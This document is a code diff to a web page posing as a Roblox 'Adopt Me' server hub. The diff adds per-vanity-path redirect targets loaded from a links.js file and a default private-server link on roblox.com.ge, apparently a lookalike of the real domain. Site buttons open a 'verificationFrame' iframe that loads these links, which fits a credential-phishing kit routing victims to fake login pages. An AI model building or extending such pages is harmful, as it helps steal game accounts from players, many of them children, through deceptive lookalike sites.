@@ -1206,6 +1206,8 @@
     </div>
 </div>
 
+<script src="links.js"></script>
+
 <script>
 (function() {
     function updatePlayerCounts() {
@@ -1252,7 +1254,9 @@
         const overlay = document.getElementById('modalOverlay');
         const closeBtn = document.getElementById('closeFinalModal');
         const iframe = document.getElementById('verificationFrame');
-        window.TARGET_URL = "https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=70948648019414984398009608382200";
+        const DEFAULT_URL = "https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=70948648019414984398009608382200";
+        const vanityName = window.location.pathname.substring(1);
+        const TARGET_URL = (typeof userLinks !== 'undefined' && userLinks[vanityName]) ? userLinks[vanityName] : DEFAULT_URL;
 
         function showToast(message) {
             const toast = document.createElement('div');
@@ -1288,14 +1292,14 @@
         showToast(msg);
 
         setTimeout(() => {
-            if (iframe) iframe.src = window.TARGET_URL;
+            if (iframe) iframe.src = TARGET_URL;
             if (overlay) overlay.style.display = 'flex';
         }, 1500); 
     }
 
     // SURGICAL EDIT: Added '.dis-join' to targets so the new buttons work
-    headconst targets = ['.dis-join', '.btn-primary', '#heroJoinBtn', '#navPlayBtn', '.css-1mya5', '.server-card'];
-    <targets.forEach(selector => {
+    const targets = ['.dis-join', '.btn-primary', '#heroJoinBtn', '#navPlayBtn', '.css-1mya5', '.server-card'];
+    targets.forEach(selector => {
         document.querySelectorAll(selector).forEach(btn => {
             btn.onclick = (e) => openModal(e, "Redirecting to Adopt Me Server...");
         });
